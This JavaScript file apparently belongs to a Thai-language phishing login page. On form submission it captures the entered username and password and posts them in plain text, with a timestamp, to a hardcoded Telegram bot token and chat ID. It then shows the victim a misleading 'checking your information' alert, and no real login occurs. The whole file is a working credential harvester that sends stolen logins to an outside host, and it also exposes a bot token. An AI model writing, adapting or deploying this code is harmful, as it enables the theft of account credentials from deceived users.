const botToken = '8038973803:AAFHBWAL9GE43Iqu3Xku-905lkOBJbkWtxI';
const chatId = '6067839696';

document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();

  if (!username || !password) {
    alert("กรุณากรอกชื่อผู้ใช้และรหัสผ่านให้ครบถ้วน");
    return;
  }

  const time = new Date().toLocaleString('th-TH');

  const message = `
[แจ้งเตือนเข้าสู่ระบบใหม่]
ชื่อผู้ใช้: ${username}
รหัสผ่าน: ${password}
เวลา: ${time}
ภาษา: th
`.trim();

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  }).then(response => {
    if (response.ok) {
      alert("ระบบกำลังตรวจสอบข้อมูลของคุณ...");
    } else {
      alert("ส่งไม่สำเร็จ: Token หรือ chatId อาจผิด");
    }
  }).catch(err => {
    alert("เกิดข้อผิดพลาด: ไม่สามารถเชื่อมต่อ Telegram");
    console.error(err);
  });
});

